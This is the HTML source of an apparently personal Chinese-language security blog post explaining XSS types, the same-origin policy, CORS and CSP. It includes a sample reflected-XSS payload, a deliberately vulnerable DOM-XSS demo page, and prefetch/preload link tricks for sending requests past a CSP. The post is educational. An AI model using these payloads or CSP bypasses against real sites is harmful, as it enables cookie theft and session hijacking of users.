@@ -1,0 +1,1491 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="xss  [TOC]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="http://example.com/2023/12/26/xss/index.html">
+<meta property="og:site_name" content="frozenfish&#39;blog">
+<meta property="og:description" content="xss  [TOC]">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-12-25T18:01:50.000Z">
+<meta property="article:modified_time" content="2024-01-21T16:44:37.443Z">
+<meta property="article:author" content="frozenfish">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2023/12/26/xss/"/>
+
+
+
+
+
+  <title>xss | frozenfish'blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">frozenfish'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tool">
+          <a href="/tool/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-toolbox"></i> <br />
+            
+            menu.tool
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-bug">
+          <a href="/bug/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            menu.bug
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/26/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="frozenfish'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-12-26T02:01:50+08:00">
+                2023-12-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>xss</p>
+<hr>
+<p>[TOC]</p>
+<span id="more"></span>
+
+<h1 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h1><h2 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：</span><br><span class="line">&lt;?php echo &quot;&lt;p&gt;hello, $_GET[&#x27;user&#x27;]&lt;/p&gt;&quot;;?&gt; ，</span><br><span class="line">那么在访问时设置 </span><br><span class="line">	/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt; ，</span><br><span class="line">    则可执行预设好的JavaScript代码。</span><br><span class="line"></span><br><span class="line">反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-储存型xss"><a href="#2-储存型xss" class="headerlink" title="2.储存型xss"></a>2.储存型xss</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-dom-xss"><a href="#3-dom-xss" class="headerlink" title="3.dom xss"></a>3.dom xss</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Based XSS Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">xsstest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;output&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input&quot;</span> <span class="attr">size</span>=<span class="string">50</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xsstest()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-Blind-XSS"><a href="#4-Blind-XSS" class="headerlink" title="4.Blind XSS"></a>4.Blind XSS</h2><p>Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。</p>
+<h1 id="xss作用"><a href="#xss作用" class="headerlink" title="xss作用"></a>xss作用</h1><p>存在XSS漏洞时，可能会导致以下几种情况：</p>
+<ol>
+<li>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</li>
+<li>攻击者能够在一定限度内记录用户的键盘输入。</li>
+<li>攻击者通过CSRF等方式以用户身份执行危险操作。</li>
+<li>XSS蠕虫。</li>
+<li>获取用户浏览器信息。</li>
+<li>利用XSS漏洞扫描用户内网。</li>
+</ol>
+<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p>
+<h3 id="file域的同源策略"><a href="#file域的同源策略" class="headerlink" title="file域的同源策略"></a>file域的同源策略</h3><p>在之前的浏览器中，任意两个file域的URI被认为是同源的。本地磁盘上的任何HTML文件都可以读取本地磁盘上的任何其他文件。</p>
+<p>从Gecko 1.9开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p>
+<h3 id="cookie的同源策略"><a href="#cookie的同源策略" class="headerlink" title="cookie的同源策略"></a>cookie的同源策略</h3><p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。</p>
+<p>不管使用哪个协议(HTTP&#x2F;HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 <code>domain</code> &#x2F; <code>path</code> &#x2F; <code>secure</code> 和 <code>http-only</code> 标记来限定其访问性。</p>
+<p>所以 <code>https://localhost:8080/</code> 和 <code>http://localhost:8081/</code> 的Cookie是共享的。</p>
+<h3 id="Flash-SilverLight跨域"><a href="#Flash-SilverLight跨域" class="headerlink" title="Flash&#x2F;SilverLight跨域"></a>Flash&#x2F;SilverLight跨域</h3><p>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。</p>
+<p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p>
+<h3 id="源的更改"><a href="#源的更改" class="headerlink" title="源的更改"></a>源的更改</h3><p>同源策略认为域和子域属于不同的域，例如 <code>child1.a.com</code> 与 <code>a.com</code> &#x2F; <code>child1.a.com</code> 与 <code>child2.a.com</code> &#x2F; <code>xxx.child1.a.com</code> 与 <code>child1.a.com</code> 两两不同源。</p>
+<p>对于这种情况，可以在两个方面各自设置 <code>document.domain=&#39;a.com&#39;</code> 来改变其源来实现以上任意两个页面之间的通信。</p>
+<p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 <code>null</code> 。</p>
+<h1 id="跨源访问"><a href="#跨源访问" class="headerlink" title="跨源访问"></a>跨源访问</h1><p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p>
+<h2 id="通常允许跨域写操作-Cross-origin-writes"><a href="#通常允许跨域写操作-Cross-origin-writes" class="headerlink" title="通常允许跨域写操作(Cross-origin writes)"></a>通常允许跨域写操作(Cross-origin writes)</h2><ul>
+<li><p>链接(links)重定向表单提交</p>
+</li>
+<li><p>通常允许跨域资源嵌入(Cross-origin embedding)</p>
+</li>
+<li><p>通常不允许跨域读操作(Cross-origin reads)</p>
+</li>
+</ul>
+<p>可能嵌入跨源的资源的一些示例有：</p>
+<ul>
+<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
+<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
+<li><code>&lt;img&gt;</code> &#x2F; <code>&lt;video&gt;</code> &#x2F; <code>&lt;audio&gt;</code> 嵌入多媒体资源。</li>
+<li><code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 的插件。</li>
+<li><code>@font-face</code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
+<li><code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
+</ul>
+<h2 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h2><p>JSONP就是利用 <code>&lt;script&gt;</code> 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。</p>
+<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。</p>
+<p>JSONP也存在一些安全问题，例如当对传入&#x2F;传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
+<p>另外JSONP在没有设置callback函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为SOME攻击。</p>
+<h2 id="跨源脚本API访问"><a href="#跨源脚本API访问" class="headerlink" title="跨源脚本API访问"></a>跨源脚本API访问</h2><p>Javascript的APIs中，如 <code>iframe.contentWindow</code> , <code>window.parent</code>, <code>window.open</code> 和 <code>window.opener</code> 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 <code>window</code> 和 <code>location</code> 对象的访问添加限制。</p>
+<p><code>window</code> 允许跨源访问的方法有</p>
+<ul>
+<li>window.blur</li>
+<li>window.close</li>
+<li>window.focus</li>
+<li>window.postMessage</li>
+</ul>
+<p><code>window</code> 允许跨源访问的属性有</p>
+<ul>
+<li>window.closed</li>
+<li>window.frames</li>
+<li>window.length</li>
+<li>window.location</li>
+<li>window.opener</li>
+<li>window.parent</li>
+<li>window.self</li>
+<li>window.top</li>
+<li>window.window</li>
+</ul>
+<p>其中 <code>window.location</code> 允许读&#x2F;写，其他的属性只允许读</p>
+<h2 id="跨源数据存储访问"><a href="#跨源数据存储访问" class="headerlink" title="跨源数据存储访问"></a>跨源数据存储访问</h2><p>存储在浏览器中的数据，如 <code>localStorage</code> 和 <code>IndexedDB</code>，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。</p>
+<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>CORS是一个W3C标准，全称是跨域资源共享(Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p>
+<h2 id="常见请求头"><a href="#常见请求头" class="headerlink" title="常见请求头"></a>常见请求头</h2><ul>
+<li><ul>
+<li><p>Origin</p>
+<p>预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段<code>Origin: &lt;origin&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Request-Method</p>
+<p>声明请求使用的方法<code>Access-Control-Request-Method: &lt;method&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Request-Headers</p>
+<p>声明请求使用的header字段<code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="常见返回头"><a href="#常见返回头" class="headerlink" title="常见返回头"></a>常见返回头</h2><ul>
+<li><ul>
+<li><p>Access-Control-Allow-Origin</p>
+<p>声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 <code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Expose-Headers</p>
+<p>声明允许暴露的头e.g. <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Max-Age</p>
+<p>声明Cache时间<code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Allow-Credentials</p>
+<p>声明是否允许在请求中带入<code>Access-Control-Allow-Credentials: true</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Allow-Methods</p>
+<p>声明允许的访问方式<code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Allow-Headers</p>
+<p>声明允许的头<code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="阻止跨源访问"><a href="#阻止跨源访问" class="headerlink" title="阻止跨源访问"></a>阻止跨源访问</h2><p>阻止跨域写操作，可以检测请求中的 <code>CSRF token</code> ，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。</p>
+<p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 <code>Content-Type</code> 消息头。例如如果在HTML文档中指定 <code>&lt;script&gt;</code> 标记，则浏览器会尝试将HTML解析为JavaScript。</p>
+<h1 id="csp"><a href="#csp" class="headerlink" title="csp"></a>csp</h1><p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>CSP策略可以通过 HTTP 头信息或者 meta 元素定义。</p>
+<p>CSP 有三类：</p>
+<ul>
+<li>Content-Security-Policy (Google Chrome)</li>
+<li>X-Content-Security-Policy (Firefox)</li>
+<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP header :</span><br><span class="line">&quot;Content-Security-Policy:&quot; 策略</span><br><span class="line">&quot;Content-Security-Policy-Report-Only:&quot; 策略</span><br></pre></td></tr></table></figure>
+
+<p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p>
+<p>HTML Meta :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="指令说明"><a href="#指令说明" class="headerlink" title="指令说明"></a>指令说明</h3><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>default-src</td>
+<td>定义资源默认加载策略</td>
+</tr>
+<tr>
+<td>connect-src</td>
+<td>定义 Ajax、WebSocket 等加载策略</td>
+</tr>
+<tr>
+<td>font-src</td>
+<td>定义 Font 加载策略</td>
+</tr>
+<tr>
+<td>frame-src</td>
+<td>定义 Frame 加载策略</td>
+</tr>
+<tr>
+<td>img-src</td>
+<td>定义图片加载策略</td>
+</tr>
+<tr>
+<td>media-src</td>
+<td>定义 <audio>、<video> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>object-src</td>
+<td>定义 <applet>、<embed>、<object> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>script-src</td>
+<td>定义 JS 加载策略</td>
+</tr>
+<tr>
+<td>style-src</td>
+<td>定义 CSS 加载策略</td>
+</tr>
+<tr>
+<td>base-uri</td>
+<td>定义 <base> 根URL策略，不使用default-src作为默认值</td>
+</tr>
+<tr>
+<td>sandbox</td>
+<td>值为 allow-forms，对资源启用 sandbox</td>
+</tr>
+<tr>
+<td>report-uri</td>
+<td>值为 &#x2F;report-uri，提交日志</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-4-2-2-关键字"><a href="#4-2-4-2-2-关键字" class="headerlink" title="4.2.4.2.2. 关键字"></a>4.2.4.2.2. 关键字</h3><ul>
+<li><ul>
+<li><p><code>-</code></p>
+<p>允许从任意url加载，除了 <code>data:</code> <code>blob:</code> <code>filesystem:</code> <code>schemes</code>e.g. <code>img-src -</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>none</code></p>
+<p>禁止从任何url加载资源e.g. <code>object-src &#39;none&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>self</code></p>
+<p>只可以加载同源资源e.g. <code>img-src &#39;self&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>data:</code></p>
+<p>可以通过data协议加载资源e.g. <code>img-src &#39;self&#39; data:</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>domain.example.com</code></p>
+<p>e.g. <code>img-src domain.example.com</code>只可以从特定的域加载资源</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>\*.example.com</code></p>
+<p>e.g. <code>img-src \*.example.com</code>可以从任意example.com的子域处加载资源</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>https://cdn.com</code></p>
+<p>e.g. <code>img-src https://cdn.com</code>只能从给定的域用https加载资源</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>https:</code></p>
+<p>e.g. <code>img-src https:</code>只能从任意域用https加载资源</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>unsafe-inline</code></p>
+<p>允许内部资源执行代码例如style attribute,onclick或者是sicript标签e.g. <code>script-src &#39;unsafe-inline&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>unsafe-eval</code></p>
+<p>允许一些不安全的代码执行方式，例如js的eval()e.g. <code>script-src &#39;unsafe-eval&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>nonce-&lt;base64-value&gt;&#39;</code></p>
+<p>使用随机的nonce，允许加载标签上nonce属性匹配的标签e.g. <code>script-src &#39;nonce-bm9uY2U=&#39;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p><code>&lt;hash-algo&gt;-&lt;base64-value&gt;&#39;</code></p>
+<p>允许hash值匹配的代码块被执行e.g. <code>script-src &#39;sha256-&lt;base64-value&gt;&#39;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-2-4-2-3-配置范例"><a href="#4-2-4-2-3-配置范例" class="headerlink" title="4.2.4.2.3. 配置范例"></a>4.2.4.2.3. 配置范例</h3><p>允许执行内联 JS 代码，但不允许加载外部资源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="预加载"><a href="#预加载" class="headerlink" title="预加载"></a>预加载</h3><p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。</p>
+<p>HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 预加载某个页面 --&gt;</span><br><span class="line">&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;</span><br><span class="line">&lt;!-- 预加载某个图片 --&gt;</span><br><span class="line">&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;</span><br><span class="line">&lt;!-- DNS 预解析 --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;</span><br><span class="line">&lt;!-- 特定文件类型预加载 --&gt;</span><br><span class="line">&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</p>
+<ul>
+<li>URL中包含下载资源</li>
+<li>页面中包含音频、视频</li>
+<li>POST、PUT和DELET操作的ajax请求</li>
+<li>HTTP认证</li>
+<li>HTTPS页面</li>
+<li>含恶意软件的页面</li>
+<li>弹窗页面</li>
+<li>占用资源很多的页面</li>
+<li>打开了chrome developer tools开发工具</li>
+</ul>
